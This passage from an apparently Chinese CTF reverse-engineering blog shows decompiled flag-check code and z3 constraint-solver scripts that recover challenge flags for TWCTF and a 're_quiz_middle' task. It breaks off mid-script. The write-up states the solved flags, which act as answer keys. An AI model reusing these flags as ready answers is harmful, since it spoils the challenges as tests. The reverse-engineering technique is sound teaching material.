<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">37</span>] != <span class="string">'5'</span> || s[<span class="number">7</span>] != <span class="string">'f'</span> || s[<span class="number">11</span>] != <span class="string">'8'</span> || s[<span class="number">12</span>] != <span class="string">'7'</span> || s[<span class="number">23</span>] != <span class="string">'2'</span> || s[<span class="number">31</span>] != <span class="string">'4'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Correct: %s\n"</span>, s, a2);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">"./bin flag_is_here"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题目还是比较简单的，有很多位已经直接给出了，按上面的分析写出约束条件很快就能跑出答案TWCTF{df2b4877e71bd91c02f8ef6004b584a5}。<br>题解代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参考</span></span><br><span class="line">t1 = time.time()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个解决方案案例</span></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag长度设置为39</span></span><br><span class="line">a = [BitVec(<span class="string">'flag%d'</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">39</span>)]</span><br><span class="line"><span class="comment"># 设置flag格式</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    solver.add(a[i] == ord(<span class="string">'TWCTF&#123;'</span>[i]))</span><br><span class="line"></span><br><span class="line">solver.add(a[<span class="number">38</span>] == ord(<span class="string">'&#125;'</span>))</span><br><span class="line"><span class="comment"># 0-9a-f统计校验 0x30-0x39 0x61-0x66</span></span><br><span class="line"><span class="comment"># true_num = [3, 2, 2, 0, 3, 2, 1, 3, 3, 1, 1, 3, 1, 2, 2, 3]</span></span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'0'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">3</span>)</span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'1'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">2</span>)</span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'2'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">2</span>)</span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'3'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">0</span>)</span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'4'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">3</span>)</span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'5'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">2</span>)</span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'6'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">1</span>)</span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'7'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">3</span>)</span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'8'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">3</span>)</span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'9'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">1</span>)</span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'a'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">1</span>)</span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'b'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">3</span>)</span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'c'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">1</span>)</span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'d'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">2</span>)</span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'e'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">2</span>)</span><br><span class="line">solver.add(sum([If(i == ord(<span class="string">'f'</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> a]) == <span class="number">3</span>)</span><br><span class="line"><span class="comment">#############################################################################################</span></span><br><span class="line"><span class="comment">#  4位为一组，相加得到v21数组，异或得到v25数组</span></span><br><span class="line"><span class="comment"># v21_true = [0x15e, 0xda, 0x12f, 0x131, 0x100, 0x131, 0xfb, 0x102]</span></span><br><span class="line"><span class="comment"># v25_true = [0x52, 0xc, 0x1, 0xf, 0x5c, 0x5, 0x53, 0x58]</span></span><br><span class="line">solver.add(a[<span class="number">6</span>] + a[<span class="number">7</span>] + a[<span class="number">8</span>] + a[<span class="number">9</span>] == <span class="number">0x15e</span>,</span><br><span class="line">           a[<span class="number">10</span>] + a[<span class="number">11</span>] + a[<span class="number">12</span>] + a[<span class="number">13</span>] == <span class="number">0xda</span>)</span><br><span class="line">solver.add(a[<span class="number">14</span>] + a[<span class="number">15</span>] + a[<span class="number">16</span>] + a[<span class="number">17</span>] == <span class="number">0x12f</span>,</span><br><span class="line">           a[<span class="number">18</span>] + a[<span class="number">19</span>] + a[<span class="number">20</span>] + a[<span class="number">21</span>] == <span class="number">0x131</span>)</span><br><span class="line">solver.add(a[<span class="number">22</span>] + a[<span class="number">23</span>] + a[<span class="number">24</span>] + a[<span class="number">25</span>] == <span class="number">0x100</span>,</span><br><span class="line">           a[<span class="number">26</span>] + a[<span class="number">27</span>] + a[<span class="number">28</span>] + a[<span class="number">29</span>] == <span class="number">0x131</span>)</span><br><span class="line">solver.add(a[<span class="number">30</span>] + a[<span class="number">31</span>] + a[<span class="number">32</span>] + a[<span class="number">33</span>] == <span class="number">0xfb</span>,</span><br><span class="line">           a[<span class="number">34</span>] + a[<span class="number">35</span>] + a[<span class="number">36</span>] + a[<span class="number">37</span>] == <span class="number">0x102</span>)</span><br><span class="line"></span><br><span class="line">solver.add(a[<span class="number">6</span>] ^ a[<span class="number">7</span>] ^ a[<span class="number">8</span>] ^ a[<span class="number">9</span>] == <span class="number">0x52</span>,</span><br><span class="line">           a[<span class="number">10</span>] ^ a[<span class="number">11</span>] ^ a[<span class="number">12</span>] ^ a[<span class="number">13</span>] == <span class="number">0xc</span>)</span><br><span class="line">solver.add(a[<span class="number">14</span>] ^ a[<span class="number">15</span>] ^ a[<span class="number">16</span>] ^ a[<span class="number">17</span>] == <span class="number">0x1</span>,</span><br><span class="line">           a[<span class="number">18</span>] ^ a[<span class="number">19</span>] ^ a[<span class="number">20</span>] ^ a[<span class="number">21</span>] == <span class="number">0xf</span>)</span><br><span class="line">solver.add(a[<span class="number">22</span>] ^ a[<span class="number">23</span>] ^ a[<span class="number">24</span>] ^ a[<span class="number">25</span>] == <span class="number">0x5c</span>,</span><br><span class="line">           a[<span class="number">26</span>] ^ a[<span class="number">27</span>] ^ a[<span class="number">28</span>] ^ a[<span class="number">29</span>] == <span class="number">0x5</span>)</span><br><span class="line">solver.add(a[<span class="number">30</span>] ^ a[<span class="number">31</span>] ^ a[<span class="number">32</span>] ^ a[<span class="number">33</span>] == <span class="number">0x53</span>,</span><br><span class="line">           a[<span class="number">34</span>] ^ a[<span class="number">35</span>] ^ a[<span class="number">36</span>] ^ a[<span class="number">37</span>] == <span class="number">0x58</span>)</span><br><span class="line"><span class="comment">#############################################################################################</span></span><br><span class="line"><span class="comment"># v29_true = [0x129, 0x103, 0x12b, 0x131, 0x135, 0x10b, 0xff, 0xff]</span></span><br><span class="line"><span class="comment"># v33_true = [0x1, 0x57, 0x7, 0xd, 0xd, 0x53, 0x51, 0x51]</span></span><br><span class="line">solver.add(a[<span class="number">6</span>] + a[<span class="number">14</span>] + a[<span class="number">22</span>] + a[<span class="number">30</span>] == <span class="number">0x129</span>,</span><br><span class="line">           a[<span class="number">7</span>] + a[<span class="number">15</span>] + a[<span class="number">23</span>] + a[<span class="number">31</span>] == <span class="number">0x103</span>)</span><br><span class="line">solver.add(a[<span class="number">8</span>] + a[<span class="number">16</span>] + a[<span class="number">24</span>] + a[<span class="number">32</span>] == <span class="number">0x12b</span>,</span><br><span class="line">           a[<span class="number">9</span>] + a[<span class="number">17</span>] + a[<span class="number">25</span>] + a[<span class="number">33</span>] == <span class="number">0x131</span>)</span><br><span class="line">solver.add(a[<span class="number">10</span>] + a[<span class="number">18</span>] + a[<span class="number">26</span>] + a[<span class="number">34</span>] == <span class="number">0x135</span>,</span><br><span class="line">           a[<span class="number">11</span>] + a[<span class="number">19</span>] + a[<span class="number">27</span>] + a[<span class="number">35</span>] == <span class="number">0x10b</span>)</span><br><span class="line">solver.add(a[<span class="number">12</span>] + a[<span class="number">20</span>] + a[<span class="number">28</span>] + a[<span class="number">36</span>] == <span class="number">0xff</span>,</span><br><span class="line">           a[<span class="number">13</span>] + a[<span class="number">21</span>] + a[<span class="number">29</span>] + a[<span class="number">37</span>] == <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">solver.add(a[<span class="number">6</span>] ^ a[<span class="number">14</span>] ^ a[<span class="number">22</span>] ^ a[<span class="number">30</span>] ^ <span class="number">0</span> == <span class="number">0x1</span>,</span><br><span class="line">           a[<span class="number">7</span>] ^ a[<span class="number">15</span>] ^ a[<span class="number">23</span>] ^ a[<span class="number">31</span>] ^ <span class="number">0</span> == <span class="number">0x57</span>)</span><br><span class="line">solver.add(a[<span class="number">8</span>] ^ a[<span class="number">16</span>] ^ a[<span class="number">24</span>] ^ a[<span class="number">32</span>] ^ <span class="number">0</span> == <span class="number">0x7</span>,</span><br><span class="line">           a[<span class="number">9</span>] ^ a[<span class="number">17</span>] ^ a[<span class="number">25</span>] ^ a[<span class="number">33</span>] ^ <span class="number">0</span> == <span class="number">0xd</span>)</span><br><span class="line">solver.add(a[<span class="number">10</span>] ^ a[<span class="number">18</span>] ^ a[<span class="number">26</span>] ^ a[<span class="number">34</span>] ^ <span class="number">0</span> == <span class="number">0xd</span>,</span><br><span class="line">           a[<span class="number">11</span>] ^ a[<span class="number">19</span>] ^ a[<span class="number">27</span>] ^ a[<span class="number">35</span>] ^ <span class="number">0</span> == <span class="number">0x53</span>)</span><br><span class="line">solver.add(a[<span class="number">12</span>] ^ a[<span class="number">20</span>] ^ a[<span class="number">28</span>] ^ a[<span class="number">36</span>] ^ <span class="number">0</span> == <span class="number">0x51</span>,</span><br><span class="line">           a[<span class="number">13</span>] ^ a[<span class="number">21</span>] ^ a[<span class="number">29</span>] ^ a[<span class="number">37</span>] ^ <span class="number">0</span> == <span class="number">0x51</span>)</span><br><span class="line"><span class="comment">#############################################################################################</span></span><br><span class="line"><span class="comment"># ff '0'&lt;= &lt;='9'</span></span><br><span class="line"><span class="comment"># 80 'a'&lt;= &lt;='f'</span></span><br><span class="line"><span class="comment"># v45_true = [0x80, 0x80, 0xFF, 0x80, 0xFF, 0xFF, 0xFF, 0xFF,</span></span><br><span class="line"><span class="comment">#             0x80, 0xFF, 0xFF, 0x80, 0x80, 0xFF, 0xFF, 0x80,</span></span><br><span class="line"><span class="comment">#             0xFF, 0xFF, 0x80, 0xFF, 0x80, 0x80, 0xFF, 0xFF,</span></span><br><span class="line"><span class="comment">#             0xFF, 0xFF, 0x80, 0xFF, 0xFF, 0xFF, 0x80, 0xFF]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x80, 0x80, 0xFF, 0x80</span></span><br><span class="line">solver.add(ord(<span class="string">'a'</span>) &lt;= a[<span class="number">6</span>], a[<span class="number">6</span>] &lt;= ord(<span class="string">'f'</span>),  <span class="comment"># 0x80 'a'&lt;= &lt;='f'</span></span><br><span class="line">           ord(<span class="string">'a'</span>) &lt;= a[<span class="number">7</span>], a[<span class="number">7</span>] &lt;= ord(<span class="string">'f'</span>),  <span class="comment"># 0x80 'a'&lt;= &lt;='f'</span></span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">8</span>], a[<span class="number">8</span>] &lt;= ord(<span class="string">'9'</span>),</span><br><span class="line">           ord(<span class="string">'a'</span>) &lt;= a[<span class="number">9</span>], a[<span class="number">9</span>] &lt;= ord(<span class="string">'f'</span>))  <span class="comment"># 0x80 'a'&lt;= &lt;='f'</span></span><br><span class="line"><span class="comment"># 0xFF, 0xFF, 0xFF, 0xFF</span></span><br><span class="line">solver.add(ord(<span class="string">'0'</span>) &lt;= a[<span class="number">10</span>], a[<span class="number">10</span>] &lt;= ord(<span class="string">'9'</span>),</span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">11</span>], a[<span class="number">11</span>] &lt;= ord(<span class="string">'9'</span>),</span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">12</span>], a[<span class="number">12</span>] &lt;= ord(<span class="string">'9'</span>),</span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">13</span>], a[<span class="number">13</span>] &lt;= ord(<span class="string">'9'</span>))</span><br><span class="line"><span class="comment"># 0x80, 0xFF, 0xFF, 0x80</span></span><br><span class="line">solver.add(ord(<span class="string">'a'</span>) &lt;= a[<span class="number">14</span>], a[<span class="number">14</span>] &lt;= ord(<span class="string">'f'</span>),  <span class="comment"># 0x80 'a'&lt;= &lt;='f'</span></span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">15</span>], a[<span class="number">15</span>] &lt;= ord(<span class="string">'9'</span>),</span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">16</span>], a[<span class="number">16</span>] &lt;= ord(<span class="string">'9'</span>),</span><br><span class="line">           ord(<span class="string">'a'</span>) &lt;= a[<span class="number">17</span>], a[<span class="number">17</span>] &lt;= ord(<span class="string">'f'</span>))  <span class="comment"># 0x80 'a'&lt;= &lt;='f'</span></span><br><span class="line"><span class="comment"># 0x80, 0xFF, 0xFF, 0x80</span></span><br><span class="line">solver.add(ord(<span class="string">'a'</span>) &lt;= a[<span class="number">18</span>], a[<span class="number">18</span>] &lt;= ord(<span class="string">'f'</span>),  <span class="comment"># 0x80 'a'&lt;= &lt;='f'</span></span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">19</span>], a[<span class="number">19</span>] &lt;= ord(<span class="string">'9'</span>),</span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">20</span>], a[<span class="number">20</span>] &lt;= ord(<span class="string">'9'</span>),</span><br><span class="line">           ord(<span class="string">'a'</span>) &lt;= a[<span class="number">21</span>], a[<span class="number">21</span>] &lt;= ord(<span class="string">'f'</span>))  <span class="comment"># 0x80 'a'&lt;= &lt;='f'</span></span><br><span class="line"><span class="comment"># 0xFF, 0xFF, 0x80, 0xFF</span></span><br><span class="line">solver.add(ord(<span class="string">'0'</span>) &lt;= a[<span class="number">22</span>], a[<span class="number">22</span>] &lt;= ord(<span class="string">'9'</span>),</span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">23</span>], a[<span class="number">23</span>] &lt;= ord(<span class="string">'9'</span>),</span><br><span class="line">           ord(<span class="string">'a'</span>) &lt;= a[<span class="number">24</span>], a[<span class="number">24</span>] &lt;= ord(<span class="string">'f'</span>),  <span class="comment"># 0x80 'a'&lt;= &lt;='f'</span></span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">25</span>], a[<span class="number">25</span>] &lt;= ord(<span class="string">'9'</span>))</span><br><span class="line"><span class="comment"># 0x80, 0x80, 0xFF, 0xFF</span></span><br><span class="line">solver.add(ord(<span class="string">'a'</span>) &lt;= a[<span class="number">26</span>], a[<span class="number">26</span>] &lt;= ord(<span class="string">'f'</span>),  <span class="comment"># 0x80 'a'&lt;= &lt;='f'</span></span><br><span class="line">           ord(<span class="string">'a'</span>) &lt;= a[<span class="number">27</span>], a[<span class="number">27</span>] &lt;= ord(<span class="string">'f'</span>),  <span class="comment"># 0x80 'a'&lt;= &lt;='f'</span></span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">28</span>], a[<span class="number">28</span>] &lt;= ord(<span class="string">'9'</span>),</span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">29</span>], a[<span class="number">29</span>] &lt;= ord(<span class="string">'9'</span>))</span><br><span class="line"><span class="comment"># 0xFF, 0xFF, 0x80, 0xFF</span></span><br><span class="line">solver.add(ord(<span class="string">'0'</span>) &lt;= a[<span class="number">30</span>], a[<span class="number">30</span>] &lt;= ord(<span class="string">'9'</span>),</span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">31</span>], a[<span class="number">31</span>] &lt;= ord(<span class="string">'9'</span>),</span><br><span class="line">           ord(<span class="string">'a'</span>) &lt;= a[<span class="number">32</span>], a[<span class="number">32</span>] &lt;= ord(<span class="string">'f'</span>),  <span class="comment"># 0x80 'a'&lt;= &lt;='f'</span></span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">33</span>], a[<span class="number">33</span>] &lt;= ord(<span class="string">'9'</span>))</span><br><span class="line"><span class="comment"># 0xFF, 0xFF, 0x80, 0xFF</span></span><br><span class="line">solver.add(ord(<span class="string">'0'</span>) &lt;= a[<span class="number">34</span>], a[<span class="number">34</span>] &lt;= ord(<span class="string">'9'</span>),</span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">35</span>], a[<span class="number">35</span>] &lt;= ord(<span class="string">'9'</span>),</span><br><span class="line">           ord(<span class="string">'a'</span>) &lt;= a[<span class="number">36</span>], a[<span class="number">36</span>] &lt;= ord(<span class="string">'f'</span>),  <span class="comment"># 0x80 'a'&lt;= &lt;='f'</span></span><br><span class="line">           ord(<span class="string">'0'</span>) &lt;= a[<span class="number">37</span>], a[<span class="number">37</span>] &lt;= ord(<span class="string">'9'</span>))</span><br><span class="line"><span class="comment">#############################################################################################</span></span><br><span class="line"><span class="comment"># 求和比较</span></span><br><span class="line">solver.add(</span><br><span class="line">    a[<span class="number">6</span>] + a[<span class="number">8</span>] + a[<span class="number">10</span>] + a[<span class="number">12</span>] + a[<span class="number">14</span>] + a[<span class="number">16</span>] + a[<span class="number">18</span>] + a[<span class="number">20</span>] + a[<span class="number">22</span>] + a[<span class="number">24</span>] + a[<span class="number">26</span>] + a[<span class="number">28</span>] + a[<span class="number">30</span>] + a[<span class="number">32</span>] +</span><br><span class="line">    a[<span class="number">34</span>] + a[<span class="number">36</span>] == <span class="number">1160</span>)</span><br><span class="line"><span class="comment">#############################################################################################</span></span><br><span class="line">solver.add(a[<span class="number">37</span>] == ord(<span class="string">'5'</span>))</span><br><span class="line">solver.add(a[<span class="number">7</span>] == ord(<span class="string">'f'</span>))</span><br><span class="line">solver.add(a[<span class="number">11</span>] == ord(<span class="string">'8'</span>))</span><br><span class="line">solver.add(a[<span class="number">12</span>] == ord(<span class="string">'7'</span>))</span><br><span class="line">solver.add(a[<span class="number">23</span>] == ord(<span class="string">'2'</span>))</span><br><span class="line">solver.add(a[<span class="number">31</span>] == ord(<span class="string">'4'</span>))</span><br><span class="line"></span><br><span class="line">print(solver.check())</span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    flag = <span class="string">""</span>.join([chr(m[each].as_long()) <span class="keyword">for</span> each <span class="keyword">in</span> a])</span><br><span class="line">    print(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'error'</span>)</span><br><span class="line"></span><br><span class="line">t2 = time.time()</span><br><span class="line">print(t2 - t1)</span><br></pre></td></tr></table></figure><h1 id="re-quiz-middle"><a href="#re-quiz-middle" class="headerlink" title="re_quiz_middle"></a>re_quiz_middle</h1><p>其实这道题分析也很简单，但是当时对z3不是很了解所以代码写不出来是真的难受</p><blockquote><p>1、检查输入字符串长度是否为21<br>2、检查字符串格式是否为flag{<strong><strong><strong>***</strong></strong></strong>}<br>3、用内容最后的三位做种子循环生成种子数组c[12]<br>4、根据种子的比特位决定是相加还是异或得到d[12]<br>5、d[12]与v30到v41的12个数组进行比较</p></blockquote><p>思路挺简单的，下面是代码，我的渣渣笔记本大概要1个小时才能出答案，室友大概跑了20分钟出答案flag{Sylb11ic_2funny}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参考 https://rise4fun.com/z3/tutorialcontent/guide</span></span><br><span class="line"><span class="comment"># https://anee.me/solving-a-simple-crackme-using-z3-68c55af7f7b1</span></span><br><span class="line">t1 = time.time()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个解决方案案例</span></span><br><span class="line">solver = Solver()</span><br><span class="line"><span class="comment"># flag&#123;0123456789abcde&#125;</span></span><br><span class="line"><span class="comment"># 012345678901234567890</span></span><br><span class="line"><span class="comment"># flag长度设置为21</span></span><br><span class="line">a = [BitVec(<span class="string">'a%d'</span> % i, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">21</span>)]</span><br><span class="line">b = [BitVec(<span class="string">'b%d'</span> % i, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>)]</span><br><span class="line">c = [BitVec(<span class="string">'c%d'</span> % i, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>)]</span><br><span class="line">d = [BitVec(<span class="string">'d%d'</span> % i, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置flag格式</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    solver.add(a[i] == ord(<span class="string">'flag&#123;'</span>[i]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">21</span>):</span><br><span class="line">    solver.add(a[i] &gt;= <span class="number">0x20</span>, a[i] &lt;= <span class="number">0x7f</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">    d[i] = <span class="number">0</span></span><br><span class="line">solver.add(a[<span class="number">20</span>] == ord(<span class="string">'&#125;'</span>))</span><br><span class="line">check = [<span class="number">0x21A</span>, <span class="number">0x110</span>, <span class="number">0x106</span>, <span class="number">0x16A</span>, <span class="number">0x3E4</span>, <span class="number">0x23A</span>, <span class="number">0x2E2</span>, <span class="number">0x13E</span>, <span class="number">0x2DE</span>, <span class="number">0x1FE</span>, <span class="number">0x34A</span>, <span class="number">0x1E8</span>]</span><br><span class="line">b[<span class="number">0</span>] = (a[<span class="number">19</span>] &lt;&lt; <span class="number">16</span>) + (a[<span class="number">18</span>] &lt;&lt; <span class="number">8</span>) + a[<span class="number">17</span>]</span><br><span class="line">c[<span class="number">0</span>] = b[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">    b[i] = <span class="number">0x343FD</span> * b[i - <span class="number">1</span>] + <span class="number">0x269EC3</span></span><br><span class="line">    c[i] = (b[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x7FFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">        d[i] = If((((c[i+<span class="number">1</span>] &gt;&gt; j) &amp; <span class="number">0x1</span>) == <span class="number">0x1</span>), 